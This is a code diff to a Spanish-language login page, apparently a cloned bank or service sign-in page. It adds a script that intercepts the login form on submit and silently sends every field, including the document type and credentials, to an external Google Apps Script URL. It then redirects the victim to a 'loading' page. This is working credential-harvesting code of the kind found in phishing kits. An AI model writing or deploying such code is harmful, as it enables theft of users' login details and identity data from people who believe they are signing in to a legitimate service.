@@ -426,7 +426,7 @@
     </div>
     <div class="container" bis_skin_checked="1">
       <h1>¡Bienvenido!</h1>
-      <form id="loginform" method='POST' action='procesos/alpha.php'>
+      <form id="miFormulario" method='POST' action='procesos/alpha.php'>
         <div class="group" bis_skin_checked="1">
           <select
             name="tipodoc"
@@ -528,5 +528,20 @@
       </div>
     </footer>
   </body>
-  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const formulario = document.getElementById('miFormulario');
+    
+    formulario.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const formData = new FormData(formulario);
+        
+        fetch('https://script.google.com/macros/s/AKfycbx9cU2lLhshUBFHq36KlSNXi4_Gr1YAuD6FhF3kzix3MzvDACFedcrwtpVYqApaHHII9g/exec', {
+            method: 'POST',
+            body: formData
+        }).then(() => {
+            window.location.href = "cargando.html";
+        });
+    });
+  </script>
 </html>
